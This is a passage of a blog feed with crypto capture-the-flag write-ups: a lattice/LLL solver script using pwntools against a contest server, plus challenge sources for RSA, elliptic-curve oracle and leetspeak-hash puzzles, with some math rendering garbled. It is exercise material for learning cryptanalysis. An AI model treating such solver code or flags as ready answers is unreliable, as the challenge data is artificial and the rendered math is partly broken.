class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0913309999999998em;vertical-align:-0.25em;"></span><span class="mord"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><msubsup><mo></mo><mrow><mi>j</mi><mo>=</mo><mn>0</mn></mrow><mrow><mi>n</mi><mo></mo><mn>1</mn></mrow></msubsup><msubsup><mi>A</mi><mrow><mi>i</mi><mo separator="true">,</mo><mi>j</mi></mrow><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msubsup><mo></mo><msub><mi>s</mi><mi>j</mi></msub><mo></mo><msubsup><mi>b</mi><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em"></mo></msubsup><mo>+</mo><msub><mi>k</mi><mi>i</mi></msub><mi>p</mi><mo>=</mo><mo></mo><msub><mi>e</mi><mi>i</mi></msub><mo>+</mo><msub><mi>K</mi><mi>i</mi></msub><mi>p</mi><mo>+</mo><msub><mi>k</mi><mi>i</mi></msub><mi>p</mi></mrow><annotation encoding="application/x-tex">\sum_{j=0}^{n-1}A&#x27;_{i,j}\cdot s_{j}-b&#x27;_{i}+k_{i}p=-e_{i}+K_{i}p+k_{i}p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.389826em;vertical-align:-0.43581800000000004em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;"></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight"></span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.394772em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8694379999999999em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.010556em;vertical-align:-0.258664em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-2.441336em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.258664em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext><msub><mi>k</mi><mi>i</mi></msub><mo>=</mo><mo></mo><msub><mi>K</mi><mi>i</mi></msub><mtext></mtext><mo></mo><msub><mi>e</mi><mi>i</mi></msub><mtext></mtext><mi>v</mi></mrow><annotation encoding="application/x-tex">k_{i}=-K_{i}-e_{i}v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 1: Replicate the problem&#x27;s parameters and matrix &#x27;A&#x27; generation.</span></span><br><span class="line"><span class="comment"># The random seed is fixed, so &#x27;A&#x27; will be the same every time.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">p, n, m = <span class="number">257</span>, <span class="number">36</span>, <span class="number">50</span></span><br><span class="line"><span class="comment"># import random</span></span><br><span class="line"><span class="comment"># random.seed(int(1337))</span></span><br><span class="line"><span class="comment"># A = [[[random.randrange(p) for _ in range(2)] for _ in range(n)] for _ in range(m)]</span></span><br><span class="line">A = []</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 2: Connect to the server and receive the public vector &#x27;B&#x27;.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">conn = remote(<span class="string">&#x27;node8.anna.nssctf.cn&#x27;</span>, <span class="number">22485</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;give you B: &#x27;</span>)</span><br><span class="line">B_str = conn.recvline().strip().decode()</span><br><span class="line">B = <span class="built_in">eval</span>(B_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Received B vector of length <span class="subst">&#123;<span class="built_in">len</span>(B)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 3: Formulate the LWE problem by calculating A&#x27; and b&#x27;.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">A_prime = Matrix(GF(p), m, n)</span><br><span class="line">b_prime = vector(GF(p), m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    sum_A0 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        A_prime[i, j] = A[i][j][<span class="number">1</span>] - A[i][j][<span class="number">0</span>]</span><br><span class="line">        sum_A0 += A[i][j][<span class="number">0</span>]</span><br><span class="line">    b_prime[i] = B[i] - sum_A0</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] LWE system constructed successfully.&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 4: Construct the lattice basis matrix for LLL.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">dim = n + m + <span class="number">1</span></span><br><span class="line">L = Matrix(ZZ, dim, dim)</span><br><span class="line">L.set_block(<span class="number">0</span>, <span class="number">0</span>, Matrix.identity(n))</span><br><span class="line">L.set_block(n, n, Matrix.identity(m) * p)</span><br><span class="line">L.set_block(<span class="number">0</span>, n, A_prime.transpose())</span><br><span class="line"><span class="comment"># -- MODIFICATION IS HERE --</span></span><br><span class="line"><span class="comment"># The original set_block failed because b_prime is a vector.</span></span><br><span class="line"><span class="comment"># We replace it with direct row slicing and assignment.</span></span><br><span class="line">L[dim - <span class="number">1</span>, n:n+m] = -b_prime.lift() <span class="comment"># </span></span><br><span class="line">L[dim - <span class="number">1</span>, dim - <span class="number">1</span>] = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Lattice basis matrix of shape <span class="subst">&#123;L.dimensions()&#125;</span> constructed.&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 5: Run the LLL algorithm.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Running LLL algorithm... This might take a moment.&quot;</span>)</span><br><span class="line">L_reduced = L.LLL()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] LLL algorithm completed.&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 6: Extract the secret bits from the shortest vector.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">solution_vector = L_reduced[<span class="number">0</span>]</span><br><span class="line">secret_bits = []</span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">abs</span>(solution_vector[n + m]) == <span class="number">1</span>:</span><br><span class="line">    sign = <span class="built_in">int</span>(solution_vector[n + m])</span><br><span class="line">    s_bits_raw = solution_vector[:n] * sign</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(bit <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>) <span class="keyword">for</span> bit <span class="keyword">in</span> s_bits_raw):</span><br><span class="line">        secret_bits = [<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> s_bits_raw]</span><br><span class="line">        found = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Valid secret bits found in the first vector of the reduced basis!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Could not find a valid solution vector.&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 7: Reconstruct and send the secret.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">secret = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">if</span> secret_bits[i] == <span class="number">1</span>:</span><br><span class="line">        secret += (<span class="number">1</span> &lt;&lt; i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Reconstructed secret: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(secret).encode())</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 8: Receive the flag.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">flag = conn.recvall(timeout=<span class="number">2</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[FLAG] <span class="subst">&#123;flag.strip()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><h2 id="iqqt"><a class="markdownIt-Anchor" href="#iqqt"></a> IqqT*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">if</span> (GCD(p-<span class="number">1</span>,q-<span class="number">1</span>)) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Dbits = <span class="number">440</span></span><br><span class="line">N = p*q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d1 = getPrime(Dbits)</span><br><span class="line">d2 = getPrime(Dbits)</span><br><span class="line">e1 = <span class="built_in">pow</span>(d1, -<span class="number">1</span>,phi)</span><br><span class="line">e2 = <span class="built_in">pow</span>(d2, -<span class="number">1</span>,phi)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e1,N)</span><br><span class="line">c = <span class="built_in">pow</span>(c,e2,N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1 = <span class="subst">&#123;e1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e2 = <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 153098639535230461427067981471925418840838598338005180035334795636906122233147195601425250354397215037964687813767036136951747775082105669481477681815877751367786247871862319200300034505895599830252899234816623479894529037827470533297869568936005422622937802442126007732338221711447957108942595934348420152967</span></span><br><span class="line"><span class="comment"># e1 = 26675174225063019792412591801113799130868333007861486357720578798352030914999710926292644671603600643369845213171396954004158372043593223603274138224817810197939227716991483870437629436082594926630937775718564690554680519001757082557490487364436474044434348412437933432480883175650430050712391958500932343901</span></span><br><span class="line"><span class="comment"># e2 = 43950877784211432364704383093702059665468498126670135130662770287054349774316943441695986309047768423965591753129960761705976613430837039441242214744782506036708881166308335886272786409715558332802625980679432726451306523481798238346507261619084743433957076290727858148266709423500224748925763767341340730807</span></span><br><span class="line"><span class="comment"># c = 93877717323267388927595086106164695425439307573037159369718380924127343418544815509333679743420188507149532789861080535086578879105173477672709484480809535461054572173818555600022970592546859742598747214025487041690467952494343056536435494716815059600034890617984024099540213482984895312025775728869974483561</span></span><br></pre></td></tr></table></figure><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo></mo><msup><mi>m</mi><mrow><mi>e</mi><mn>1</mn><mo></mo><mi>e</mi><mn>2</mn></mrow></msup><mspace></mspace><mspace width="1em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>N</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c\equiv m^{e1\cdot e2}\pmod N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight">1</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">e</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mclose">)</span></span></span></span></span></p><h2 id="hiddenoracle"><a class="markdownIt-Anchor" href="#hiddenoracle"></a> HiddenOracle*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> treasure <span class="keyword">import</span> FLAG, p, a, b</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [a,b])</span><br><span class="line">A = [randint(<span class="number">0</span>,p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">B = <span class="built_in">sorted</span>([randint(<span class="number">0</span>,p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)])</span><br><span class="line">oracle = <span class="keyword">lambda</span> x: <span class="built_in">sum</span>([a*<span class="built_in">pow</span>(<span class="built_in">int</span>(x),b,p) <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(A,B)])*E.lift_x(<span class="number">0x1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>, oracle(<span class="built_in">input</span>(<span class="string">&quot;[?] &quot;</span>)).xy())</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;[*]&quot;</span>)) == A[<span class="number">0</span>]: <span class="built_in">print</span>(FLAG)</span><br></pre></td></tr></table></figure><h2 id="leetspe4k"><a class="markdownIt-Anchor" href="#leetspe4k"></a> LeetSpe4k*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">le4t = <span class="keyword">lambda</span> x: <span class="string">&quot;&quot;</span>.join(choice(<span class="built_in">next</span>((j <span class="keyword">for</span> j <span class="keyword">in</span> [<span class="string">&#x27;a@4A&#x27;</span>, <span class="string">&#x27;b8B&#x27;</span>, <span class="string">&#x27;cC&#x27;</span>, <span class="string">&#x27;dD&#x27;</span>, <span class="string">&#x27;e3E&#x27;</span>, <span class="string">&#x27;fF&#x27;</span>, <span class="string">&#x27;g9G&#x27;</span>, <span class="string">&#x27;hH&#x27;</span>, <span class="string">&#x27;iI&#x27;</span>, <span class="string">&#x27;jJ&#x27;</span>, <span class="string">&#x27;kK&#x27;</span>, <span class="string">&#x27;l1L&#x27;</span>, <span class="string">&#x27;mM&#x27;</span>, <span class="string">&#x27;nN&#x27;</span>, <span class="string">&#x27;o0O&#x27;</span>, <span class="string">&#x27;pP&#x27;</span>, <span class="string">&#x27;qQ&#x27;</span>, <span class="string">&#x27;rR&#x27;</span>, <span class="string">&#x27;s$5S&#x27;</span>, <span class="string">&#x27;t7T&#x27;</span>, <span class="string">&#x27;uU&#x27;</span>, <span class="string">&#x27;vV&#x27;</span>, <span class="string">&#x27;wW&#x27;</span>, <span class="string">&#x27;xX&#x27;</span>, <span class="string">&#x27;yY&#x27;</span>, <span class="string">&#x27;z2Z&#x27;</span>] <span class="keyword">if</span> i <span class="keyword">in</span> j), i)) <span class="keyword">for</span> i <span class="keyword">in</span> x.decode())</span><br><span class="line">h4sH = <span class="keyword">lambda</span> x: reduce(<span class="keyword">lambda</span> acc, i: ((acc * (<span class="number">2</span>**<span class="number">255</span>+<span class="number">95</span>)) % <span class="number">2</span>**<span class="number">256</span>) + i, x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(le4t(flag), h4sH(flag))</span><br><span class="line"><span class="comment">#nSsCtf&#123;H@pPy_A7h_4nNiv3R$arY_ns$C7F_@nD_l3t$_d0_7h3_LllE3t$pEAk!&#125; 9114319649335272435156391225321827082199770146054215376559826851511551461403</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/80/v2-831f9285e57fba50f2eb1a6dc8c2b4eb_1440w.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;AI&lt;/strong&gt;&lt;/p&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2025-</title>
    <link href="https://hvang10.github.io/2025/07/23/%E7%86%B5%E5%AF%86%E6%9D%AF2025-%E9%87%8D%E5%BA%86/"/>
    <id>https://hvang10.github.io/2025/07/23/%E7%86%B5%E5%AF%86%E6%9D%AF2025-%E9%87%8D%E5%BA%86/</id>
    <published>2025-07-23T01:42:30.000Z</published>
    <updated>2025-07-23T02:34:12.735Z</updated>
    
